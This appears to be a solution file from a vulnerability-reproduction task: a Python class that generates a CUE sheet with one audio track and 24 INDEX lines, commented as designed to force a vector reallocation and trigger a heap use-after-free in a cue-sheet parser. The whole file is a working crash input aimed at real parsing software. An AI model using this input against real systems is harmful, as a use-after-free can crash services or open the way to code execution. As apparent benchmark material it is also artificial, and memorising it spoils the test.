class Solution:
    def solve(self, src_path: str) -> bytes:
        lines = []
        lines.append('FILE "a" WAVE')
        lines.append('TRACK 01 AUDIO')
        # The vulnerability is a Heap Use-After-Free triggered when the vector of seekpoints
        # (indices) is reallocated while a reference to an element is held.
        # We add enough INDEX entries to force a vector reallocation (likely crossing capacity 8 or 16).
        for i in range(1, 25):
            lines.append(f'INDEX {i:02d} 00:00:{i:02d}')
        
        return "\n".join(lines).encode('utf-8')